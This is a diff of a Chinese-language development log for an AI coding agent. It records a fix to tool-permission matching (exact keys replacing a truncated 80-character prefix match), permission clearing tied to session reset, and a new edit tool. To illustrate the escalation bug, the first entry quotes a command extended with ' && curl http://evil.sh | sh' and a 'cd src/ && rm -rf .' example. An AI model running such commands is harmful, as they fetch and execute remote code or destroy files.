@@ -11,6 +11,74 @@
 
 ---
 
+## 2026-09-04 21:54 | 授权键从“args JSON 前 80 字符 + 前缀匹配”改成“工具定义的边界 + 精确匹配”，并把 clear() 接进会话生命周期
+
+**牵连系统 / 层次**：公共接口层（core/tools.ts 加第二个可选成员 `permissionKey?`、core/permission.ts 参数改名 `detail` → `authKey`）· 工具子系统（tools/registry.ts 转发、tools/builtin.ts 三个需确认的工具各给一个键 + `bash` 补弹窗文案）· 权限子系统（permission/manager.ts 换 `Set` 精确匹配并重写注释）· Agent Loop 子系统（loop/agent-loop.ts 权限段：两个变量的截断策略分开）· 运行时编排层（runtime/runtime.ts 的 `clearSession`）· 命令层（commands/builtin/clear.ts 的说明与回执）· 验证层（新增 scripts/verify-permission.ts 62 项；verify-edit.ts 的 A5 与头部承重设计③ 跟着改，因为源码形状变了）· 文档层（ARCHITECTURE.md 第四节第 10 条债标 ✅ 并补“怎么修的”、GLOSSARY 新增 `permissionKey` 词条并改正 `permissionDetail` 词条里已失真的一句、DECISION_LOG 记一条取舍、TESTING / 目录 两份快照同步到 14 套 482 项、ROADMAP 记一条已完成）
+
+**面向的问题**：
+- **截断 + 前缀 = 静默扩权**（实测，不是推导）：授权键是 `JSON.stringify(args).slice(0, 80)`，而 `PermissionManager` 用 `startsWith` 匹配。批准过 `node node_modules/typescript/bin/tsc --noEmit && node scripts/run-verify.mjs`（76 字符）之后，同一条命令再接 ` && curl http://evil.sh | sh`（104 字符）也会自动放行——两个键在 80 字符处截成了逐字符相同的字符串。用户点的是“允许这一条”，系统给出的是“允许前 80 字符相同的所有调用”
+- **注释声称的目录级授权一次也没生效过**：`manager.ts` 举例“授权 `write:src/` → `write:src/data.txt` 命中前缀 → 自动放行”，但唯一的真实调用方传的键含内容片段（形如 `{"path":"src/data.txt","content":"...`），换一个文件、甚至同一文件换内容就失配。这是本项目第四处“注释里的调用方与真实调用点长期不一致”（前三处：`jsonl-storage.ts` 头注释、`runtime.onInput()`、`appendMessage` 的 `extra`）
+- **`clear()` 是项目第三处“支持但未接线”**：契约声明了、`PermissionManager` 实现了、`runtime.permission` 还是 public 字段，但全 `src/` 零调用方 → “本次全部允许”实际是“**本进程**全部允许”，一直有效到退出
+- **`bash` 的 `description` 参数承诺“仅用于权限确认提示”，却从未出现在弹窗上**：它只是混在 args 的 JSON 里，而且命令一长就被 80 字符截掉
+- 上一轮（`edit`）只把**显示**从匹配键里拆出去（`detail` / `autoKey` 两个变量），匹配与记录仍共用同一个截断串——那一轮阻止了洞变坏，没修洞
+
+**做出的改动**：
+- `core/tools.ts`：给 `ToolDefinition` 与 `ToolProvider` 各加第二个**可选**成员 `permissionKey?`（与 `permissionDetail?` 同一手法；做成可选是硬要求，全库 7 处 `ToolProvider` 替身加必需成员会全部打坏）。契约注释写明“该返回的是这次授权的边界”“别塞进每次都变的内容片段”
+- `tools/builtin.ts`：三个需确认的工具各定义一个键——`write` / `edit` 是归一化后的 `path`（反斜杠→正斜杠，免得 `src\x.ts` 与 `src/x.ts` 算成两个键），**刻意不含** `content` / `oldText` / `newText`；`bash` 是**完整命令**，一字不截。另给 `bash` 补 `permissionDetail`：有 `description` 时显示“用途: 命令”（命令截到 60 字符），没有就只显示命令；同样受单行约束（`flat()` 把空白压成单个空格）
+- `tools/registry.ts`：加 `permissionKey(name, args)` 转发（`this.tools.get(name)?.permissionKey?.(args)`），工具没定义或工具名不存在都返回 `undefined`
+- `permission/manager.ts`：`autoAllowed` 从 `string[]` + `some((prefix) => key.startsWith(prefix))` 换成 `Set<string>` + `has(`${toolName}:${authKey}`)` **精确匹配**；注释整段重写，写明“为什么不是把键换成真路径让前缀匹配生效”（`bash` 的键是完整命令，`cd src/` 就以 `/` 结尾，按“以 / 结尾就前缀放行”等于批准 `cd src/ && rm -rf .`）；`clear()` 的注释补上真实调用方
+- `core/permission.ts`：两个方法的参数名 `detail` → `authKey`（detail 在本项目专指弹窗文案，同名正是当初混淆的根源），头注释的调用方补上 `runtime.ts`
+- `loop/agent-loop.ts`：`autoKey = tools.permissionKey?.(…) || argsJson`（兜底改成**完整** args JSON，不再 `.slice(0, 80)`），`detail = tools.permissionDetail?.(…) || argsJson.slice(0, 80)`（仍截 80）。两个变量的截断策略**刻意相反**，承重注释写在调用点：键不截（截断 + 前缀 = 扩权），文案截（弹窗标题只有 1 行）
+- `runtime/runtime.ts`：`clearSession()` 在 `session.clear()` 之后加 `this.permission.clear()`，并补头注释说明为什么连带清授权；`commands/builtin/clear.ts` 的说明改成“清空当前会话与本次工具授权”、回执写明授权一并撤销（UI 不说谎：它现在清的不只是会话）
+- 新增 `scripts/verify-permission.ts`（62 项、7 段）：真 `ToolRegistry` + 真 `PermissionManager`（不打桩），③ 段带“改前的截断键确实把这两条命令判成同一个键”的**对照组**（C1 / C2）再钉反例（C4 / C7 / C10 / C11），④ 段把文件级放宽钉成显式断言，⑦ 段造真 `Runtime` 给 `clear()` 接线做**行为证明**（数它被调了几次）
+
+**解决的问题**：
+- 授权范围从“args 的 JSON 前 80 字符相同的所有调用”收窄成“**用户点‘本次全部允许’时那一次调用的边界**”：`write` / `edit` 是那个文件，`bash` 是那条命令
+- 前缀级授权一并消失：授权 `write:src/x.ts` 不再放行 `write:src/x.ts.bak`（改前 `startsWith` 会放行）
+- “本次”终于等于本次会话：`/clear` 与 RPC 的 clear 都走 `clearSession()`，会话清了授权也清
+- 弹窗上能看到 `bash` 的用途说明，`description` 参数的承诺兑现了
+- 洞被钉死成断言，且带改前对照组：下次谁想把 `.slice(0, 80)` 或 `startsWith` 加回来，会先撞上 `verify-permission.ts` 的 C1 / C2 / C4
+
+**未来可优化**：
+- 目录级 / 通配授权明确不做。要做得先有一个“只按路径授权”的独立入口（把文件类工具与命令类工具分开对待），不能靠匹配规则顺带实现
+- `bash` 的键是完整命令 → 多一个空格就重新弹窗。要做“命令级白名单”（例如允许所有 `npm run *`）需要命令语义解析，本轮刻意不做
+- `write` / `edit` 的文件级放宽若要收紧，得引入内容哈希或 diff 预览，代价是每次确认都要读文件——而 `permissionKey` 的契约明写“不要在这里做文件 I/O”（它在渲染路径上被同步调用）
+- 7 处 permission 替身里只有 `verify-permission.ts` 那处实现了 `clear()`（就为了数它被调几次），其余 6 处没有（各自用 `: any`（phase-ab）/ `as never`（c2 / c3 / usage / events）/ 整个 options 对象 `as any`（session）绕开类型）。但归因不能只算到 cast 头上：`tsconfig.json` 的 include 只有 `src/**/*.ts`，`scripts/` 根本不进 tsc（tsx 只剥类型不检查），所以契约即使把 `clear()` 改成必需方法，那 6 处也不会报错——**把 cast 去掉也照样不报**（这是“验证脚本不受类型检查”那条既定取舍的连带代价，见 TESTING.md）
+- `verify-permission.ts` 里有一批断言是直接对源码文本做正则（钉承重注释与调用点形状），源码改写措辞时会误报——与 `verify-edit.ts` 同一手法，是“防后人顺手改坏”的既定代价
+
+---
+
+## 2026-09-04 20:37 | 给工具契约加“弹窗文案”这个可选成员，并把兼三职的 detail 拆开：精准编辑工具 edit 落地
+
+**牵连系统 / 层次**：公共接口层（core/tools.ts 的 ToolDefinition 与 ToolProvider 各加一个可选成员）· 工具子系统（tools/builtin.ts 新增第 6 个工具、tools/registry.ts 转发）· Agent Loop 子系统（loop/agent-loop.ts 的权限段）· 提示词层（context/sections/core-section.ts 的【铁律】）· 权限子系统（permission/manager.ts 本轮**一行未改**，只查出债并记入 [ARCHITECTURE.md](./ARCHITECTURE.md#四已知架构债) 第四节第 10 条）· 验证层（新增 scripts/verify-edit.ts 41 项）· 文档层（ROADMAP 关三条已做完的待办 + GLOSSARY 两个新词条 + TESTING / 目录 / ARCHITECTURE 三份现状快照）
+
+**面向的问题**：
+- 改文件里的一小段只有 `write` 一条路：把整篇重抄一遍。重抄会把没打算改的地方一并改掉，长文件里还容易漏抄，而且从工具调用记录里看不出“这次到底改了哪几行”
+- 权限弹窗的文案是 `JSON.stringify(args).slice(0, 80)`，而这同一个变量兼着三职：`isAutoAllowed()` 的匹配键、`grantAutoAllow()` 的记录键、`onPermission()` 的显示文案。对 `write` 勉强够用（前 80 字符能看到 path），但 `edit` 的参数里有 `oldText` / `newText` 两段文本，前 80 字符连路径都显示不全——用户在看不出要改什么的情况下决定放不放行
+- 富文本 detail 与匹配键不能是同一个东西：若让工具自定义的文案同时当匹配键，“本次全部允许”会永远匹配不上（每次文案都不一样），表现为每次都要重新点
+
+**做出的改动**：
+- `core/tools.ts`：`ToolDefinition` 与 `ToolProvider` 各加一个**可选**成员 `permissionDetail?`（与 `EventBus.emitHook?`、`SessionStorage.getAllStored?` 同一手法）。做成可选是硬要求：全库有 7 处替身 implements `ToolProvider`，加必需成员会全部打坏
+- `loop/agent-loop.ts`：把 `detail` 拆成 `autoKey`（匹配与记录）+ `detail`（显示，`tools.permissionDetail?.(…) || autoKey` 兜底）。`autoKey` 的格式与拆分前**逐字符相同**，所以已记下的授权既不失配也不扩权
+- `tools/builtin.ts`：新增 `edit`。四步——按字节读全文 → 数 `oldText` 命中次数 → `indexOf` + 字面切片拼接替换 → 还原行尾与 BOM 后写回并**按字节验证**。命中次数三分流：0 次拒绝、1 次替换、多次拒绝并回**候选行号**（除非显式 `replaceAll: true`）。另加 `requireStringAllowEmpty` 助手（`newText` 传空串是“删掉这一段”的合法意图，不能当缺参拒绝）
+- `context/sections/core-section.ts`：【铁律】加一条“改一小段用 edit，不要用 write 重抄全文”，并把“edit 拒绝时先 read 看清原文再重试”写进提示词（否则模型会把拒绝当成工具坏了，转头去用 write）
+- 新增 `scripts/verify-edit.ts`（41 项、7 段），用真 `ToolRegistry` + `registerBuiltinTools`（不打桩），在 `fs.mkdtempSync` 临时目录里造各种行尾/BOM 的文件按字节比
+
+**解决的问题**：
+- 局部修改不必再重抄全文，“改哪里”从提示词约定变成工具能力
+- 弹窗文案与授权匹配键解耦：`edit` 现在显示“改 src/x.ts: 旧片段 → 新片段”，而“本次全部允许”照常工作
+- 定位失败被接进既有的“重复失败保护”：`edit` 的 0 命中 / 多命中刻意用 `[ERROR]` 前缀（而不是 `[NO_MATCH]` 这类软前缀），因为 `agent-loop` 只把 `[ERROR]` / `[VERIFY_FAILED]` 记作失败、而重复失败保护只在失败时计数（第 2 次同样调用就追加系统提示叫模型别原样重试）。用软前缀等于把这层保护关掉——这条已写成承重注释 + 断言
+- Windows 上的 CRLF 与 BOM 不再被破坏：纯 CRLF 文件在 `\n` 归一化副本上匹配、写回前整体还原（否则模型发来的 `\n` 版 oldText 必然 0 命中，工具会在最需要它的地方失效）；混合行尾按字面匹配，宁可拒绝也不做波及全文的还原
+- ROADMAP 的三条失真待办被关掉（P6 系统提示词模板层、P7 系统提示词强化、P7 测试验证闭环）：它们早已做完却还挂着 `- [ ]`，本轮逐条拿代码核实后才关
+
+**未来可优化**：
+- `edit` 的“唯一性”是按字面全文算的，不做语法感知（不知道 oldText 落在函数内还是注释里）。再进一步得引入 AST 或 diff 视图，代价是新依赖——与“零运行时依赖”的既定路线冲突
+- `PermissionManager` 的前缀匹配同时**过窄**（注释声称的目录级授权从未生效）与**过宽**（前 80 字符相同即共用一次授权），且 `clear()` 是项目第三处“支持但未接线”（“本次全部允许”实际是“本进程全部允许”）。本轮只阻止它变坏，修它属独立任务，见 ARCHITECTURE.md 第四节第 10 条
+- 工具参数校验仍是手写 `requireString`，`edit` 又添了一个变体；ROADMAP P6 的“工具参数校验框架”（schema 自动校验）落地后这几个助手可以收掉
+- `verify-edit.ts` 只覆盖 `edit`，ls / read / write / grep / bash 五个仍无直接断言（TESTING.md 第七节已记）
+
+---
+
 ## 2026-09-04 15:30 | 更正一条贯穿五处的错误前提“会话存储只存纯文本”，并查出被它掩盖的承重结构（runtime 的历史丢弃 ↔ Anthropic 安全阀）
 
 **牵连系统 / 层次**：LLM 协议层（llm/types.ts 的 thinkingBlocks 注释、llm/anthropic.ts 的 resolveAnthropicThinking 注释）· 运行时编排层（runtime.ts 的 toolMessages 组装点与两处 appendMessage 调用点，各加承重警告注释）· 会话存储层（session/jsonl-storage.ts 的 appendMessage / getMessages 两处注释）· 文档层（GLOSSARY 两个词条、ARCHITECTURE.md 第四节新增第 9 条、本文件 2026-08-31 那块的两处行内更正标注）· 验证层（verify-session.ts 新增 ⑨ 段）。注：**运行时行为一行未改**，本轮全部是注释、文档与断言
